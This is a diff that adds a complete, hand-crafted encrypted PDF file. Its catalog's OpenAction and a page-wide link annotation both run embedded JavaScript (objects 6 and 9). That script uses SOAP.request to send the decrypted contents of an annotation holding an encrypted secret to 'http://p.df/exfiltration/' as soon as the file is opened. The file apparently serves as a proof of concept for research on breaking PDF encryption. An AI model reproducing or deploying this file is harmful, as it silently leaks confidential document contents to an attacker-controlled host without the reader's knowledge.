@@ -1,0 +1,107 @@
+%PDF-2.0
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /Names << /EmbeddedFiles << /Names [4 0 R << /Type /Filespec /EF << /F 5 0 R >> /F 4 0 R >>] >> >>
+     /OpenAction 9 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >>
+     /Annots [7 0 R 8 0 R]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 112 >>
+stream
+øe•æ1cáÂà¨oW‹%ÍdÑ&s6‡«¡ð‘*aTDGT€Ú#Mù§Öe|ƒë¦(µ·¡\ãõ"Œá–¬@’Ü¹®-õ¦GÈx,P„É¢5œðàQî8À¢{~<°‚-ÜmyžÆT	Ðùº·endstream
+endobj
+
+5 0 obj
+<d6ce19c7b6925d3783febd227c8cdc69c69c2e980e2bc4ca4147d005151b4ef0> % = enc(SECRET)
+endobj
+
+6 0 obj
+  << /Type /EmbeddedFile
+     /Filter [/Crypt]
+     /Length 101
+  >>
+stream
+SOAP.request({cURL:"http://p.df/exfiltration/"+this.getAnnots()[0].contents,oRequest:{},cAction:""})
+endstream
+endobj
+
+7 0 obj
+  << /Type /Annot
+     /Subtype /FreeText
+     /BS << /S /S /W 0 >>
+     /Rect [107 620 500 720] /F 4
+     /DA <f86595e63163e1c2e0a86f578b25cd64d1260e7336190d87aba1f008912a1061541744475480da234df9a7d6657c83eb7f16a628b5b7a15ce30cf5228ce196ac4092dc1bb9ae2df5a647c8782c135084c9a2359cf013e05117ee38c0a27b7e3c01b0822ddc6d79169ec65409d0f9bab7>
+     /Contents 5 0 R
+  >>
+endobj
+
+8 0 obj
+  << /Type /Annot
+     /Subtype /Link
+     /Rect [0 0 595 600]
+     /A 9 0 R
+     /H /N
+  >>
+endobj
+
+9 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS 6 0 R
+  >>
+endobj
+
+10 0 obj
+  << /CF << /StdCF << /AuthEvent /DocOpen /CFM /AESV3 /Length 32 >> >>
+     /Filter /Standard /Length 256 /V 5 /R 6
+     /P -4 /Perms <fcad2d4fe80a90afb401ee8901056755>
+     /StmF /StdCF /StrF /StdCF /EFF /Identity
+     /OE <27777df6c7040f4c85aafbf559de20637a9855fe98636ec2141700e375df3d84>
+     /UE <b8d8da858ed776d4a8f5a3ccfec2042005f4fed8c3e2697be3ae4c51184a949c>
+     /O <fdd16cfae9bceaa2ef1f78126343387b75080b81cb35bd5634286cc2df43eda49ce2e529c644066dbc8f93df7dcd47df>
+     /U <830a02d98fc125c903b743be4c3c7281b72f280fbdf1c5eedcb80f013a15de8b96081028e8da117d1f4feb0cb4079c76>
+  >>
+endobj
+
+xref
+0 11
+0000000000 65535 f 
+0000000010 00000 n 
+0000000196 00000 n 
+0000000297 00000 n 
+0000000495 00000 n 
+0000000660 00000 n 
+0000000759 00000 n 
+0000000962 00000 n 
+0000001342 00000 n 
+0000001451 00000 n 
+0000001526 00000 n 
+trailer
+  << /Root 1 0 R
+     /Size 11
+     /Encrypt 10 0 R
+     /ID [<b38cc78df687e1e4a507e8f12956c91a><b38cc78df687e1e4a507e8f12956c91a>]
+  >>
+startxref
+2129
+%%EOF
